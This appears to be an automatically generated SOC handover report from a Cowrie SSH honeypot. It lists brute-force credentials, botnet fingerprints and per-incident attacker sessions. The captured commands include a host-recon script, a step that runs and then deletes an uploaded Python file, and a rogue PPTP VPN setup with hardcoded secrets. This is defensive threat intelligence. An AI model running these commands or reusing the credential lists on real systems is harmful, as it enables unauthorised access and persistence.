# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-15 |
| **Generated At** | 2026-06-15T22:22:38Z |
| **Shift Time** | 22:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **139** |
| Confirmed Threats | **83** |
| False Positives Filtered | **56** (40.3%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **11** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **111** |
| Malware Samples Analyzed | **1** HIGH · **14** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **28** |
| Unique Credential Pairs | **12** |
| Unique Usernames | **6** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `backup` | 3 |
| `GET / HTTP/1.0` | 2 |
| `GET / HTTP/1.1` | 1 |
| `USER test` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `LeitboGi0ro` | 7 |
| `123@@@` | 5 |
| `smo@@kkklss` | 3 |
| `﻿------fuck------` | 3 |
| `password` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 7 |
| `root` | `123@@@` | 5 |
| `root` | `smo@@kkklss` | 3 |
| `root` | `﻿------fuck------` | 3 |
| `root` | `password` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `backup` | `123456789` | `91.92.40.13` | 2026-06-15T16:56:39 |
| `backup` | `12345` | `91.92.40.13` | 2026-06-15T16:59:06 |
| `backup` | `12345678` | `91.92.40.13` | 2026-06-15T17:00:44 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-15T17:24:32 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-15T17:24:32 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-15T17:37:40 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-15T17:37:40 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-15T17:37:44 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.184` | 2026-06-15T18:08:52 |
| `root` | `123@@@` | `165.1.75.106` | 2026-06-15T18:34:55 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-06-15T18:34:55 |
| `root` | `password` | `185.125.201.79` | 2026-06-15T19:12:13 |
| `root` | `﻿------fuck------` | `58.51.132.251` | 2026-06-15T19:25:52 |
| `GET / HTTP/1.0` | `Host: 129.80.119.236` | `165.154.29.169` | 2026-06-15T19:33:48 |
| `USER test` | `USER test` | `165.154.29.169` | 2026-06-15T19:34:00 |
| `OPTIONS rtsp://129.80.119.236 RTSP/1.0` | `CSeq:1` | `165.154.29.169` | 2026-06-15T19:34:05 |
| `root` | `﻿------fuck------` | `182.43.71.198` | 2026-06-15T19:34:55 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-15T20:01:42 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-15T20:17:37 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-15T20:17:37 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-06-15T20:17:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **139** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 25 |
| Paramiko (Python) | 15 |
| Go SSH scanner | 10 |
| OpenSSH | 7 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `a2de0f306611...` | Mirai/variant | 15 | 4 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 3 | 1 |
| `98f63c4d9c87...` | Generic scanner | 3 | 3 |
| `873a5fb5fedc...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `95420f9d932d...` | libssh | 24 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 15 | 4 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `2ec37a7cc8da...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `eeca2460550b...` | OpenSSH | 2 | 1 | libssh-based |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **1** |
| Highest Severity | **MEDIUM** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 3 | 1 | `T1082, T1592, T1078, T1083` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
Source IPs: `91.92.40.13`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **25** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (26)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-04766094d689

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-15 16:56 |
| **Last Seen** | 2026-06-15 16:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 16:56:37` | `cowrie.session.connect` |
| `2026-06-15 16:56:37` | `cowrie.client.version` |
| `2026-06-15 16:56:37` | `cowrie.client.kex` |
| `2026-06-15 16:56:39` | `cowrie.login.success` |
| `2026-06-15 16:56:40` | `cowrie.session.params` |
| `2026-06-15 16:56:40` | `cowrie.command.input` |
| `2026-06-15 16:56:40` | `cowrie.command.input` |
| `2026-06-15 16:56:40` | `cowrie.command.input` |
| `2026-06-15 16:56:40` | `cowrie.command.input` |
| `2026-06-15 16:56:40` | `cowrie.log.closed` |
| `2026-06-15 16:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c42c3b877fd4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-15 16:59 |
| **Last Seen** | 2026-06-15 16:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 16:59:04` | `cowrie.session.connect` |
| `2026-06-15 16:59:04` | `cowrie.client.version` |
| `2026-06-15 16:59:04` | `cowrie.client.kex` |
| `2026-06-15 16:59:06` | `cowrie.login.success` |
| `2026-06-15 16:59:07` | `cowrie.session.params` |
| `2026-06-15 16:59:07` | `cowrie.command.input` |
| `2026-06-15 16:59:07` | `cowrie.command.input` |
| `2026-06-15 16:59:07` | `cowrie.command.input` |
| `2026-06-15 16:59:07` | `cowrie.command.input` |
| `2026-06-15 16:59:08` | `cowrie.log.closed` |
| `2026-06-15 16:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35346eeb0238

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-15 17:00 |
| **Last Seen** | 2026-06-15 17:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 17:00:43` | `cowrie.session.connect` |
| `2026-06-15 17:00:43` | `cowrie.client.version` |
| `2026-06-15 17:00:43` | `cowrie.client.kex` |
| `2026-06-15 17:00:44` | `cowrie.login.success` |
| `2026-06-15 17:00:45` | `cowrie.session.params` |
| `2026-06-15 17:00:45` | `cowrie.command.input` |
| `2026-06-15 17:00:45` | `cowrie.command.input` |
| `2026-06-15 17:00:46` | `cowrie.command.input` |
| `2026-06-15 17:00:46` | `cowrie.command.input` |
| `2026-06-15 17:00:46` | `cowrie.log.closed` |
| `2026-06-15 17:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae53b1813a2

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-15 17:24 |
| **Last Seen** | 2026-06-15 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 17:24:31` | `cowrie.session.connect` |
| `2026-06-15 17:24:31` | `cowrie.client.version` |
| `2026-06-15 17:24:31` | `cowrie.client.kex` |
| `2026-06-15 17:24:32` | `cowrie.login.success` |
| `2026-06-15 17:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878537e6cafa

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-15 17:24 |
| **Last Seen** | 2026-06-15 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 17:24:31` | `cowrie.session.connect` |
| `2026-06-15 17:24:31` | `cowrie.client.version` |
| `2026-06-15 17:24:31` | `cowrie.client.kex` |
| `2026-06-15 17:24:32` | `cowrie.login.success` |
| `2026-06-15 17:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7858c9ac38

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-15 17:37 |
| **Last Seen** | 2026-06-15 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 17:37:40` | `cowrie.session.connect` |
| `2026-06-15 17:37:40` | `cowrie.client.version` |
| `2026-06-15 17:37:40` | `cowrie.client.kex` |
| `2026-06-15 17:37:40` | `cowrie.login.success` |
| `2026-06-15 17:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97da487f330f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-15 17:37 |
| **Last Seen** | 2026-06-15 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 17:37:40` | `cowrie.session.connect` |
| `2026-06-15 17:37:40` | `cowrie.client.version` |
| `2026-06-15 17:37:40` | `cowrie.client.kex` |
| `2026-06-15 17:37:40` | `cowrie.login.success` |
| `2026-06-15 17:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46f6c712405

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-15 17:37 |
| **Last Seen** | 2026-06-15 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 17:37:44` | `cowrie.session.connect` |
| `2026-06-15 17:37:44` | `cowrie.client.version` |
| `2026-06-15 17:37:44` | `cowrie.client.kex` |
| `2026-06-15 17:37:44` | `cowrie.login.success` |
| `2026-06-15 17:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61546abc13fc

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-06-15 18:34 |
| **Last Seen** | 2026-06-15 18:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 18:34:55` | `cowrie.session.connect` |
| `2026-06-15 18:34:55` | `cowrie.client.version` |
| `2026-06-15 18:34:55` | `cowrie.client.kex` |
| `2026-06-15 18:34:55` | `cowrie.login.success` |
| `2026-06-15 18:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0530cf9cc7e6

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-06-15 18:34 |
| **Last Seen** | 2026-06-15 18:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 18:34:55` | `cowrie.session.connect` |
| `2026-06-15 18:34:55` | `cowrie.client.version` |
| `2026-06-15 18:34:55` | `cowrie.client.kex` |
| `2026-06-15 18:34:55` | `cowrie.login.success` |
| `2026-06-15 18:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7b87ebf869

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-06-15 18:35 |
| **Last Seen** | 2026-06-15 18:37 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 18:35:18` | `cowrie.session.connect` |
| `2026-06-15 18:35:18` | `cowrie.client.version` |
| `2026-06-15 18:35:18` | `cowrie.client.kex` |
| `2026-06-15 18:35:19` | `cowrie.login.success` |
| `2026-06-15 18:35:19` | `cowrie.session.file_upload` |
| `2026-06-15 18:35:20` | `cowrie.session.params` |
| `2026-06-15 18:35:20` | `cowrie.command.input` |
| `2026-06-15 18:35:20` | `cowrie.command.input` |
| `2026-06-15 18:35:20` | `cowrie.command.input` |
| `2026-06-15 18:35:20` | `cowrie.command.failed` |
| `2026-06-15 18:35:20` | `cowrie.log.closed` |
| `2026-06-15 18:35:21` | `cowrie.session.params` |
| `2026-06-15 18:35:21` | `cowrie.command.input` |
| `2026-06-15 18:35:21` | `cowrie.log.closed` |
| `2026-06-15 18:35:22` | `cowrie.session.params` |
| `2026-06-15 18:35:22` | `cowrie.command.input` |
| `2026-06-15 18:35:22` | `cowrie.log.closed` |
| `2026-06-15 18:35:23` | `cowrie.session.params` |
| `2026-06-15 18:35:23` | `cowrie.command.input` |
| `2026-06-15 18:35:23` | `cowrie.command.failed` |
| `2026-06-15 18:35:23` | `cowrie.command.failed` |
| `2026-06-15 18:36:24` | `cowrie.session.params` |
| `2026-06-15 18:36:24` | `cowrie.command.input` |
| `2026-06-15 18:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e82414852e9

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-06-15 18:37 |
| **Last Seen** | 2026-06-15 18:39 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 18:37:39` | `cowrie.session.connect` |
| `2026-06-15 18:37:39` | `cowrie.client.version` |
| `2026-06-15 18:37:39` | `cowrie.client.kex` |
| `2026-06-15 18:37:40` | `cowrie.login.success` |
| `2026-06-15 18:37:41` | `cowrie.session.file_upload` |
| `2026-06-15 18:37:41` | `cowrie.session.params` |
| `2026-06-15 18:37:41` | `cowrie.command.input` |
| `2026-06-15 18:37:41` | `cowrie.command.input` |
| `2026-06-15 18:37:41` | `cowrie.command.input` |
| `2026-06-15 18:37:41` | `cowrie.command.failed` |
| `2026-06-15 18:37:42` | `cowrie.log.closed` |
| `2026-06-15 18:37:42` | `cowrie.session.params` |
| `2026-06-15 18:37:42` | `cowrie.command.input` |
| `2026-06-15 18:37:42` | `cowrie.log.closed` |
| `2026-06-15 18:37:43` | `cowrie.session.params` |
| `2026-06-15 18:37:43` | `cowrie.command.input` |
| `2026-06-15 18:37:43` | `cowrie.log.closed` |
| `2026-06-15 18:37:44` | `cowrie.session.params` |
| `2026-06-15 18:37:44` | `cowrie.command.input` |
| `2026-06-15 18:37:44` | `cowrie.command.failed` |
| `2026-06-15 18:37:44` | `cowrie.command.failed` |
| `2026-06-15 18:38:45` | `cowrie.session.params` |
| `2026-06-15 18:38:45` | `cowrie.command.input` |
| `2026-06-15 18:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-954678c1263c

| Field | Detail |
|---|---|
| **Source IP** | `185.125.201[.]79` |
| **First Seen** | 2026-06-15 19:12 |
| **Last Seen** | 2026-06-15 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id 2>/dev/null; echo SSH_OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:12:13` | `cowrie.session.connect` |
| `2026-06-15 19:12:13` | `cowrie.client.version` |
| `2026-06-15 19:12:13` | `cowrie.client.kex` |
| `2026-06-15 19:12:13` | `cowrie.login.success` |
| `2026-06-15 19:12:14` | `cowrie.client.var` |
| `2026-06-15 19:12:14` | `cowrie.client.var` |
| `2026-06-15 19:12:14` | `cowrie.session.params` |
| `2026-06-15 19:12:14` | `cowrie.command.input` |
| `2026-06-15 19:12:14` | `cowrie.log.closed` |
| `2026-06-15 19:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.125.201[.]79` to AbuseIPDB if not already reported
- [ ] Block `185.125.201[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02a7acc0b8e

| Field | Detail |
|---|---|
| **Source IP** | `185.125.201[.]79` |
| **First Seen** | 2026-06-15 19:12 |
| **Last Seen** | 2026-06-15 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(apt-get update -qq && apt-get install -y -qq pptpd ppp 2>/dev/null || apt install -y -qq pptpd ppp 2>/dev/null || yum install -y pptpd 2>/dev/null) && mkdir -p /etc/ppp && echo option /etc/ppp/options.pptpd > /etc/pptpd.conf && echo localip 10.99.0[.]1 >> /etc/pptpd.conf && echo remoteip 10.99.0[.]200-10.99.0[.]250 >> /etc/pptpd.conf && echo root1234 pptpd toor1234 * > /etc/ppp/chap-secrets && echo name pptpd, apt-get update -qq, apt-get install -y -qq pptpd ppp 2 > /dev/null, apt install -y -qq pptpd ppp 2 > /dev/null, yum install -y pptpd 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:12:15` | `cowrie.session.connect` |
| `2026-06-15 19:12:15` | `cowrie.client.version` |
| `2026-06-15 19:12:15` | `cowrie.client.kex` |
| `2026-06-15 19:12:15` | `cowrie.login.success` |
| `2026-06-15 19:12:15` | `cowrie.client.var` |
| `2026-06-15 19:12:15` | `cowrie.client.var` |
| `2026-06-15 19:12:16` | `cowrie.session.params` |
| `2026-06-15 19:12:16` | `cowrie.command.input` |
| `2026-06-15 19:12:16` | `cowrie.command.input` |
| `2026-06-15 19:12:16` | `cowrie.command.input` |
| `2026-06-15 19:12:16` | `cowrie.command.input` |
| `2026-06-15 19:12:16` | `cowrie.command.input` |
| `2026-06-15 19:12:16` | `cowrie.log.closed` |
| `2026-06-15 19:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.125.201[.]79` to AbuseIPDB if not already reported
- [ ] Block `185.125.201[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c963085d2caf

| Field | Detail |
|---|---|
| **Source IP** | `58.51.132[.]251` |
| **First Seen** | 2026-06-15 19:25 |
| **Last Seen** | 2026-06-15 19:25 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:25:09` | `cowrie.session.connect` |
| `2026-06-15 19:25:51` | `cowrie.client.version` |
| `2026-06-15 19:25:51` | `cowrie.client.kex` |
| `2026-06-15 19:25:52` | `cowrie.login.success` |
| `2026-06-15 19:25:53` | `cowrie.session.params` |
| `2026-06-15 19:25:53` | `cowrie.command.input` |
| `2026-06-15 19:25:54` | `cowrie.log.closed` |
| `2026-06-15 19:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.51.132[.]251` to AbuseIPDB if not already reported
- [ ] Block `58.51.132[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fbee846275b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.29[.]169` |
| **First Seen** | 2026-06-15 19:33 |
| **Last Seen** | 2026-06-15 19:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Connection:Close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:33:48` | `cowrie.session.connect` |
| `2026-06-15 19:33:48` | `cowrie.login.success` |
| `2026-06-15 19:33:48` | `cowrie.session.params` |
| `2026-06-15 19:33:48` | `cowrie.command.input` |
| `2026-06-15 19:33:48` | `cowrie.command.failed` |
| `2026-06-15 19:33:48` | `cowrie.command.input` |
| `2026-06-15 19:33:54` | `cowrie.log.closed` |
| `2026-06-15 19:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.29[.]169` to AbuseIPDB if not already reported
- [ ] Block `165.154.29[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
